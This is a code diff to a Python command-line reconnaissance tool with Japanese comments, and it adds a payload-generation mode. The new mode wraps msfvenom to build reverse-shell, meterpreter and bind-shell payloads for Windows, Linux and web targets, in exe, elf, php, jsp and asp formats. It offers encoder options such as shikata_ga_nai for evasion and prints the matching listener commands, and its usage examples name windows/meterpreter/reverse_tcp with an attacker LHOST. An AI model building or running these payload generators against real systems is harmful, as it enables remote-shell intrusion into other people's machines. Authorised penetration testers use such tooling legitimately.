@@ -14,6 +14,7 @@ from datetime import datetime
 from modules.network_scanner import NetworkScanner
 from modules.web_scanner import WebScanner
 from modules.osint_gatherer import OSINTGatherer
+from modules.payload_generator import PayloadGenerator
 
 def print_banner():
     """ツールのバナーを表示"""
@@ -377,6 +378,134 @@ def full_reconnaissance(target, output_dir):
     print(f"📄 レポートファイル: {report_file}")
     return all_results
 
+def payload_generation(target, output_dir, args):
+    """ペイロード生成機能"""
+    print("\n🔧 ペイロード生成を開始します...")
+    
+    # ペイロード生成器の初期化
+    payload_dir = os.path.join(output_dir, "payloads")
+    generator = PayloadGenerator(payload_dir)
+    
+    # 利用可能なペイロード一覧表示
+    if args.list_payloads:
+        generator.list_available_payloads()
+        return {'payloads': [], 'message': 'ペイロード一覧を表示しました'}
+    
+    # msfvenomの存在確認
+    if not generator.check_msfvenom():
+        print("❌ msfvenomが見つかりません。")
+        print("💡 Metasploit Frameworkをインストールしてください:")
+        print("   - Kali Linux: sudo apt install metasploit-framework")
+        print("   - Windows: https://www.metasploit.com/download")
+        print("   - macOS: brew install metasploit")
+        return {'payloads': [], 'error': 'msfvenom not found'}
+    
+    results = {'payloads': [], 'errors': []}
+    
+    # カスタムペイロードの生成
+    if args.custom_payload:
+        if not args.lhost:
+            print("❌ カスタムペイロード生成には --lhost パラメータが必要です")
+            return {'payloads': [], 'error': 'LHOST required for custom payload'}
+        
+        print(f"🔧 カスタムペイロードを生成中: {args.custom_payload}")
+        payload_info = generator.generate_custom_payload(
+            payload_name=args.custom_payload,
+            lhost=args.lhost,
+            lport=args.lport,
+            output_format=args.output_format,
+            encoder=args.encoder,
+            iterations=args.iterations
+        )
+        
+        if payload_info:
+            results['payloads'].append(payload_info)
+            
+            # リスナーコマンドの表示
+            listener_commands = generator.get_listener_commands(payload_info)
+            if listener_commands:
+                print("\n🎧 リスナーコマンド:")
+                for cmd_info in listener_commands:
+                    print(f"  {cmd_info['tool']}: {cmd_info['command']}")
+                    print(f"    # {cmd_info['description']}")
+    
+    # 特定のペイロードタイプの生成
+    elif args.payload_type and args.platform:
+        if not args.lhost:
+            print("❌ ペイロード生成には --lhost パラメータが必要です")
+            return {'payloads': [], 'error': 'LHOST required for payload generation'}
+        
+        print(f"🔧 {args.platform} {args.payload_type}ペイロードを生成中...")
+        payload_info = generator.generate_payload(
+            payload_type=args.payload_type,
+            platform=args.platform,
+            lhost=args.lhost,
+            lport=args.lport,
+            output_format=args.output_format,
+            encoder=args.encoder,
+            iterations=args.iterations
+        )
+        
+        if payload_info:
+            results['payloads'].append(payload_info)
+            
+            # リスナーコマンドの表示
+            listener_commands = generator.get_listener_commands(payload_info)
+            if listener_commands:
+                print("\n🎧 リスナーコマンド:")
+                for cmd_info in listener_commands:
+                    print(f"  {cmd_info['tool']}: {cmd_info['command']}")
+                    print(f"    # {cmd_info['description']}")
+    
+    # よくあるペイロードの一括生成
+    else:
+        if not args.lhost:
+            print("❌ ペイロード生成には --lhost パラメータが必要です")
+            return {'payloads': [], 'error': 'LHOST required for payload generation'}
+        
+        print("🚀 よくあるペイロードを一括生成中...")
+        generated_payloads = generator.generate_common_payloads(args.lhost, args.lport)
+        results['payloads'].extend(generated_payloads)
+        
+        # リスナーコマンドの表示
+        if generated_payloads:
+            print("\n🎧 リスナーコマンド例:")
+            for payload_info in generated_payloads[:2]:  # 最初の2個のみ表示
+                listener_commands = generator.get_listener_commands(payload_info)
+                if listener_commands:
+                    print(f"\n📋 {payload_info['description']}:")
+                    for cmd_info in listener_commands[:2]:  # 最初の2個のみ表示
+                        print(f"  {cmd_info['tool']}: {cmd_info['command']}")
+                        print(f"    # {cmd_info['description']}")
+    
+    # エラーの表示
+    if generator.results['errors']:
+        print("\n❌ エラー:")
+        for error in generator.results['errors']:
+            print(f"  - {error}")
+        results['errors'].extend(generator.results['errors'])
+    
+    # 結果の保存
+    if results['payloads']:
+        generator.save_results()
+        print(f"\n✅ {len(results['payloads'])}個のペイロードを生成しました")
+        print(f"📁 保存先: {payload_dir}")
+        
+        # 生成されたペイロードの一覧表示
+        print("\n📋 生成されたペイロード:")
+        for payload_info in results['payloads']:
+            print(f"  📄 {os.path.basename(payload_info['output_file'])}")
+            print(f"     - タイプ: {payload_info.get('type', 'custom')}")
+            print(f"     - プラットフォーム: {payload_info.get('platform', 'N/A')}")
+            print(f"     - サイズ: {payload_info['file_size']} bytes")
+            print(f"     - LHOST: {payload_info['lhost']}")
+            print(f"     - LPORT: {payload_info['lport']}")
+            if payload_info.get('encoder'):
+                print(f"     - エンコーダー: {payload_info['encoder']} (x{payload_info['iterations']})")
+            print()
+    
+    return results
+
 def main():
     """メイン関数"""
     parser = argparse.ArgumentParser(
@@ -388,6 +517,10 @@ def main():
   python cli.py example.com --network-only     # ネットワーク偵察のみ
   python cli.py example.com --web-only         # Web偵察のみ
   python cli.py example.com --osint-only       # OSINTのみ
+  python cli.py example.com --payload --lhost 192.168.1.100  # ペイロード一括生成
+  python cli.py example.com --payload --list-payloads        # ペイロード一覧表示
+  python cli.py example.com --payload --platform windows --payload-type meterpreter --lhost 192.168.1.100
+  python cli.py example.com --payload --custom-payload windows/meterpreter/reverse_tcp --lhost 192.168.1.100
   python cli.py example.com -o ./results       # 出力ディレクトリ指定
         """
     )
@@ -404,12 +537,28 @@ def main():
                       help='Webアプリケーション偵察のみ実行')
     group.add_argument('--osint-only', action='store_true', 
                       help='OSINT情報収集のみ実行')
+    group.add_argument('--payload', action='store_true',
+                      help='ペイロード生成のみ実行')
     
     # 追加オプション
     parser.add_argument('--verbose', '-v', action='store_true', 
                        help='詳細な出力を有効にする')
     parser.add_argument('--quiet', '-q', action='store_true', 
                        help='出力を最小限にする')
+    
+    # ペイロード生成オプション
+    parser.add_argument('--lhost', help='リスナーのIPアドレス (ペイロード生成時)')
+    parser.add_argument('--lport', type=int, default=4444, help='リスナーのポート (デフォルト: 4444)')
+    parser.add_argument('--platform', choices=['windows', 'linux', 'web'], 
+                       help='ペイロードのプラットフォーム')
+    parser.add_argument('--payload-type', choices=['reverse_shell', 'meterpreter', 'bind_shell', 'custom'],
+                       help='ペイロードタイプ')
+    parser.add_argument('--custom-payload', help='カスタムペイロード名 (例: windows/meterpreter/reverse_tcp)')
+    parser.add_argument('--output-format', choices=['raw', 'exe', 'elf', 'php', 'jsp', 'asp'],
+                       default='raw', help='出力形式 (デフォルト: raw)')
+    parser.add_argument('--encoder', help='エンコーダー (例: x86/shikata_ga_nai)')
+    parser.add_argument('--iterations', type=int, default=1, help='エンコーダーの繰り返し回数 (デフォルト: 1)')
+    parser.add_argument('--list-payloads', action='store_true', help='利用可能なペイロードを一覧表示')
     
     args = parser.parse_args()
     
@@ -428,6 +577,8 @@ def main():
             results = web_reconnaissance(args.target, args.output)
         elif args.osint_only:
             results = osint_reconnaissance(args.target, args.output)
+        elif args.payload:
+            results = payload_generation(args.target, args.output, args)
         else:
             results = full_reconnaissance(args.target, args.output)
         
